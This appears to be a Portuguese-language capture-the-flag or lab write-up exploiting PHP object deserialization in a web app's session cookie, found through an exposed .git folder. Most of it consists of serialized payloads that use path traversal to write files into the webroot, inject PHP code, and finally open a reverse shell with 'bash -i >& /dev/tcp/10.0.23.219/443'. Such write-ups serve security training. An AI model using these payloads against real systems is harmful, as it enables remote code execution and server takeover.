Enumerando a aplicação encontramos um cookie de sessão encodado em base64:
![[2025-08-20_08-00.png]]
Enumerando a aplicação encontramos o código fonte na pasta .git:
![[2025-08-20_08-03.png]]
Temos o arquivo auth_class.php que possui uma função destruct()
com uma falha de LFI:
![[2025-08-20_08-13.png]]
Ela recebe o que é passado em $username dentro do cookie e adicionar na pasta tmp:
```
O:4:"Auth":3:{s:4:"auth";i:0;s:8:"username";s:5:"guest";s:4:"role";s:5:"guest";} 
```
Vamos alterar o tamanho do campo de usarname e vamos fazer um LFI. Devemos enviar o payload para aplicação no campo de cookies codificado em base64:
```
O:4:"Auth":3:{s:4:"auth";i:0;s:27:"../../var/www/html/text.php";s:5:"guest";s:4:"role";s:5:"guest";}
```
Alterando o campo $username para um valor do diretório da aplicação podemos explorar o LFI:
```
O:4:"Auth":3:{s:4:"auth";i:1;s:8:"username";s:27:"../../var/www/html/test.php";s:4:"role";s:5:"admin";}
```
Depois acessado pelo arquivo temos ele respondendo com o conteúdo do cookie:
![[Pasted image 20250820085546.png]]

Analisando o código fonte temos que o parametro auth tambem é vulneral a LFI pois ele não é validado:
![[2025-08-20_10-14.png]]

Como a aplicação está processando nosso arquivo .php podemos tentar ler o phpinfo.php para entender como o servidor está configurado>
Vamos modificar o tipo do parâmetro auth e adicionar nossos payloads php dentro dele:
```
O:4:"Auth":3:{s:4:"auth";s:18:"<?php phpinfo();?>";s:8:"username";s:27:"../../var/www/html/test.php";s:4:"role";s:5:"admin";}
```
![[2025-08-20_09-15.png]]
Vamos usar um payload para obter uma shell reversa:
```
O:4:"Auth":3:{s:4:"auth";s:72:"<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.23.219/443 0>&1'");?>";s:8:"username";s:27:"../../var/www/html/test.php";s:4:"role";s:5:"admin";}
```
E enviando o payload conseguimos nossa reverse shell:
![[2025-08-20_10-10.png]]

`

